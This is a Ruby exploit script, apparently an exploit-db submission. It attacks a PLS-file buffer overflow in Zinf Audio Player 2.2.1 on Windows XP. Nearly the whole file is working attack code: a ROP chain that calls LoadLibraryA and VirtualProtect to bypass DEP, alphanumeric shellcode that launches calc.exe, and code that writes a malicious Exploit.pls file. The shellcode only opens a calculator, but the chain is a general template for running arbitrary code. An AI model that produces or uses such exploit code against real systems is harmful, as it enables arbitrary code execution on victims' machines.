#
#[+]Exploit Title: Zinf Audio Player v2.2.1 PLS File Buffer Overflow Vulnerability(DEP BYPASS)
#[+]Date: 03\08\2011
#[+]Author: C4SS!0 and h1ch4m
#[+]Found by: Delikon(http://www.exploit-db.com/exploits/559/) or also Metasploit(http://www.exploit-db.com/exploits/16688)
#[+]Software Link: http://sourceforge.net/projects/zinf/files/zinf/2.2.1/zinf-setup-2.2.1.exe/download
#[+]Version: 2.2.1
#[+]Tested on: Windows XP SP3 Brazilian Portuguese(DEP in AlwaysOn)
#[+]CVE: N/A
#
#
#Exploit Based in Corelan Team Tuturial https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/
#LoadLibraryA("msvcr71.dll") + VirtualProtect()
#
 
sys = `ver`
if sys =~/Windows/
system("cls")
system("color 4f")
else
system("clear")
end
print &#039;&#039;&#039;
 
        Zinf Audio Player v2.2.1 PLS File Buffer Overflow Vulnerability(DEP BYPASS)
        Created by C4SS!0 and h1ch4m
        E-mails:
            C4SS!0 : louredo_@hotmail.com
                h1ch4m : h1ch4m@hotmail.com
        Sites:
            C4SS!0 : net-fuzzer.blogspot.com
            h1ch4m : net-effects.blogspot.com
         
&#039;&#039;&#039;
sleep(3)
#Endereco para VirtualProtect 0x7C3528DD
#########################################ROP FOR LOAD "msvcr71.dll"#################################
rop = [0x10002a6f].pack(&#039;V&#039;) # PUSH ESP # POP EDI # POP ESI # POP EBP # MOV EAX,1 # POP EBX # ADD ESP,30 # RETN
rop += "A" * 12
rop += [0x0040556A].pack(&#039;V&#039;) # ADD ESP,54 # RETN // Funcao de retorno da LoadLibraryA , Depois de executar LoadLibraryA vem para AQUI.!!!
rop += "A" * (80-rop.length)
rop += [0x100014e8].pack(&#039;V&#039;) # MOV EAX,EDI # POP EDI # POP ESI # RETN
rop += "G"  * 8 # JUNK
rop += [0x1205017d].pack(&#039;V&#039;) # POP EBX # RETN   
rop += "\x00\x00\x00\x00"
rop += [0x1203678a].pack(&#039;V&#039;) # ADD EBX,EAX # NOP # NOP # NOP # NOP # RETN 
rop += [0x112054dd].pack(&#039;V&#039;) # XCHG EAX,EBP # RETN   REPLACE
rop += [0x00420044].pack(&#039;V&#039;) # POP EBP # RETN
rop += [0x0040556A].pack(&#039;V&#039;) # ADD ESP,54 # RETN // Funcao de retorno da LoadLibraryA , Depois de executar LoadLibraryA vem para AQUI.!!!
rop += [0x10001E11].pack(&#039;V&#039;) # POP EDI # RETN
rop += [0x7C801D7B].pack(&#039;V&#039;) # Endereco para LoadLibraryA  // Conserta o valor de EDI para o PUSHAD
rop += [0x1200CA76].pack(&#039;V&#039;) # PUSHAD # RETN
rop += "msvcr71.dll\x00"
rop += "D" * 56
##########################################ROP END HERE####################################
 
##########################################ROP FOR VirtualProtect###########################
rop += [0x1200edf1].pack(&#039;V&#039;) # POP EDI # RETN
rop += "JJJJ" # JUNK
rop += [0x7C3528DD].pack(&#039;V&#039;) # Ponteiro para VirtualProtect
rop += [0x00409E6A].pack(&#039;V&#039;) # MOV EAX,EBX # POP EBX #  RETN 0c
rop += "PPPP"
rop += [0x0042044B].pack(&#039;V&#039;) * 3 # RETN
rop += [0x0040dc54].pack(&#039;V&#039;) # PUSH ESI # ADD AL,5E # POP EBP # RETN 04
############################ADICIONANDO A EAX######################################
rop += [0x7C3410C3].pack(&#039;V&#039;) # POP ECX # RETN
rop += [0x00000200].pack(&#039;V&#039;) # O valor que sera adicionado a EAX
rop += [0x7C358F2C].pack(&#039;V&#039;) # ADD EAX,ECX # POP ESI # RETN
rop += "GGGG"
#####################################################################################
rop += [0x0040fd82].pack(&#039;V&#039;) # XCHG EAX,ECX # POP EBP # RETN
rop += "BBBB"
rop += [0x1201dc80].pack(&#039;V&#039;) # MOV EAX,ECX # RETN 
rop += [0x1060fd8f].pack(&#039;V&#039;) # XCHG EAX,EBP # RETN
################################MUDA O ENDEREÃ‡O DO PARAMETRO#######################################
rop += [0x1201dc80].pack(&#039;V&#039;) # MOV EAX,ECX # RETN 
rop += [0x12007AD6].pack(&#039;V&#039;) # POP EBX # RETN
rop += "\x00\x00\x00\x00"
rop += [0x7c3451b9].pack(&#039;V&#039;) # POP EDX # RETN
rop += "\x00\x00\x00\x00"
rop += [0x1203678a].pack(&#039;V&#039;) # ADD EBX,EAX # NOP # NOP # NOP # NOP # RETN  //EndereÃ§o do ultimo paramentro de VirtualProtect
rop += [0x1000333e].pack(&#039;V&#039;) # ADD EDX,EBX # POP EBX # RETN 10
rop += "QQQQ"
rop += [0x12007AD7].pack(&#039;V&#039;) * 10 # RETN
###################################################################################################
rop += [0x0040ba55].pack(&#039;V&#039;) # XCHG EAX,EDX # RETN  // Endereco disponivel
rop += [0x12011D0B].pack(&#039;V&#039;) # XCHG EAX,ECX # CMP EAX,5E5F0002 # RETN
rop += [0x12007AD7].pack(&#039;V&#039;) # RETN
rop += [0x10001436].pack(&#039;V&#039;) # MOV EAX,ECX # POP EBX # RETN
rop += "GGGG"
rop += [0x12007AD6].pack(&#039;V&#039;) # POP EBX # RETN
rop += "\x00\x03\x00\x00"
rop += [0x11601da9].pack(&#039;V&#039;) # POP EAX # RETN
rop += "\x40\x00\x00\x00"
rop += [0x0040ba55].pack(&#039;V&#039;) # XCHG EAX,EDX # RETN
rop += [0x12026C85].pack(&#039;V&#039;) # PUSHAD # RETN
rop += "A" * 156
#########################Ir para o shellcode depois da funÃ§ao VirtualProtect###############
rop += [0x10002e13].pack(&#039;V&#039;)  # ADD EAX,ECX # RETN
rop += [0x10610e4d].pack(&#039;V&#039;)  # POP ECX # RETN
rop += [0x0000012b].pack(&#039;V&#039;)  # Valor que sera adicionado a EAX
rop += [0x10002e13].pack(&#039;V&#039;)  # ADD EAX,ECX # RETN
rop += [0x111025F1].pack(&#039;V&#039;)  # CALL EAX and JMP to my Shellcode. :)
##########################################ROP END HERE#####################################
shellcode = "\x44" * (50-0x12)
shellcode +=
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIONMRU2SJXH9KHNHYD4FDK"+
"D0XGC9YX1FRP1T0B2TCRPEBK3RJMNZ8GMLV879DONSVQXK7FWLCSIJ5VLO0WXWYWVLDO0O2SZGL62OVO"+
"RP3N3DMMERZJDY3R9N0Q695JE6J3KEUYGM5LNQTR0EK3PUDYY0PN3MY3NQ4KX980PGSPPN3N5L3Q5RI9"+ #Shellcode Alpha Numeric WinExec "Calc.exe"
"GQ3J5M6MO9KMMOQ7OHZT2X2SLLUKOS1L6VDN6QKJWUGTV07YVMHMKQY4N5NG4WLE4QML9QWOOELVEXMQ"+ #Baseaddress EAX.
"2LFNN2UMWFWE2KSPLWK8OSWDJ1O8NOTGPQK1K0KJGZJ5OE8VCNW9T4Q2RUMOZ6NCTL9TSLKJNZKW0NMN"+
"LSQMFWOHKHLLX7ON4SNZQ4NQO4QMVLNMZPVD89ULWKNTQMP0M1S3L6SNXMWBYNPPIT73NOXWKRRVZRN8"+
"WDN0SUK8WOMV4DNNTWPYWN27KA"
buf = "A" * 1300
buf += rop
buf += shellcode
 
print "\t\t[+]Creating Exploit File...\n"
sleep(1)
begin
File.open("Exploit.pls","wb") do |f|
f.write buf
f.close
print "\t\t[+]File Exploit.pls create successfully.\n"
sleep(1)
end
rescue
print "**[-]Error: #{$!}\n"
exit(0)
end



